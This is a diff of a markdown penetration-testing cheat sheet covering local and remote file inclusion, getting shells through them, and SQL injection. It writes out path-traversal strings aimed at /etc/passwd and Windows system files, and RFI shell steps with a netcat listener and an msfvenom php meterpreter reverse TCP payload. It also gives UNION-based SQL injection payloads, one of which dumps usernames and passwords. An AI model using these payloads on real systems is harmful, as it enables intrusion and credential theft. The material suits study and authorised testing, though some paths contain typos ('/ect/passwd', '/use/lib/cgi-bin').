@@ -15,47 +15,48 @@ Test Blind DNS: | <code> nslookup (you need a public facing system to see nslook
 
 > **File Inclusion**
 
-Test Strings:
-{% highlight bash %}
-file%3a%2f%2f%2fetc%2fpasswd
-../../../winnt/system32.cmd.exe+/c+dir (not frequent)
-/ect/passwd
-../../../../../../../../../../../../../../ect/passwd
-{% endhighlight %}
+**Test Strings:**
+Linux Test String 1 | <code> file%3a%2f%2f%2fetc%2fpasswd </code>
+Linux Test String 2 | <code> /ect/passwd </code>
+Linux Test String 3 | <code> ../../../../../../../../../../../../../../ect/passwd </code>
+Windows IIS 1 | <code> ../../../winnt/system32.cmd.exe+/c+dir (not frequent) </code>
+Windows Test String 1 | <code> %WINDIR%\win.ini </code>
+Windows Test String 2 | <code> %SYSTEMDRIVE%\boot.ini //note only older versions of windows </code>
 
-Use ZAP to Fuzz the URL:
+
+**Using ZAP to Fuzz the URL:**
 1. Right click on request that looks injectable -> fuzz using
 [JHADDIX_LFI](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/lfi/JHADDIX_LFI.txt)
 
-What to go after:
+**What to go after - Windows:**
 * Old IIS: HTTP://vulnsite/scripts/../../../winnt/system32/CMD.exe+/C+dir (may need to encode the slashes)
 * http://vulnsite/index.php?templ=../include/siteconfig.inc (or just templ=red)
 * /global.asax
 * \docume~1\fprefect\mydocu~1
 * \windows\system32\cmd.exe
-* /etc/passwd
 * [Windows pwnwiki](http://pwnwiki.io/#!presence/windows/blind.md)
+
+**What to go after - Linux:**
+* /etc/passwd
 * [Linux pwnwiki](http://pwnwiki.io/#!presence/linux/blind.md)
 
-Debian w/ Apache:
+**File Locations -Debian w/ Apache:**
 * /var/www/html
 * /home/username/public_html
-
-CGI scripts: 
 * /use/lib/cgi-bin
 
-Auto-Extension Bypass:
+**Auto-Extension (.php) Bypass:**
 * NULL "%00"
 
 >**Shell from RFI and LFI**
 
-RFI Shell 1:
+**RFI Shell 1:**
 1. VI a webshell (https://binaryexile.github.io/6%20-%20Web%20Application/Vulnerabilities/)
 2. python -m SimpleHTTPServer 8080
 3. Set up netcat listener (if needed based on webshell)
 3. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)
 
-RFI Meterpreter Shell:
+**RFI Meterpreter Shell:**
 1. Create Payload: msfvenom LPORT=1234 LHOST=192.168.1.8 -p php/meterpreter_reverse_tcp -f raw > ~/met_rev_tcp_1234.txt
 2. Wrap it: add <?php ?> to the payload
 3.  Set up handler: 
@@ -68,8 +69,8 @@ exploit
 5. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)
 
 LFI Shell:
-*[LFI Shell 1](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/)
-*[LFI Shell 2](https://highon.coffee/blog/lfi-cheat-sheet/)
+* [LFI Shell 1](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/)
+* [LFI Shell 2](https://highon.coffee/blog/lfi-cheat-sheet/)
 
 > **SQL Injection: Test Location and Strings**
 
@@ -105,11 +106,15 @@ PostgreSQL | 5-digit Hex Error Code
 {% highlight sql %}
 dent' and 'a'='a' ORDER BY 5; #
 {% endhighlight %}
-2. See which numbers appear in the output, and select one for the union. *Note: It requires the same number of columns and compatable data type*
+2. See which numbers are visable in the output. 
 {% highlight sql %}
 Dent' UNION SELECT  '1', '2', '3', '4'; #
 {% endhighlight %}
-3.  
+3. From the visable numbers select one for the union. *Note: It requires the same number of columns and compatable data type*
+{% highlight sql %}
+Dent' UNION SELECT  '1', '2', '3', info FROM information_schema.processlist; #
+jeremy'+union+select+concat('The+password+for+',username,'+is+',+password),mysignature+from+accounts;+--+
+{% endhighlight %}
 
 > **CSRF**
 
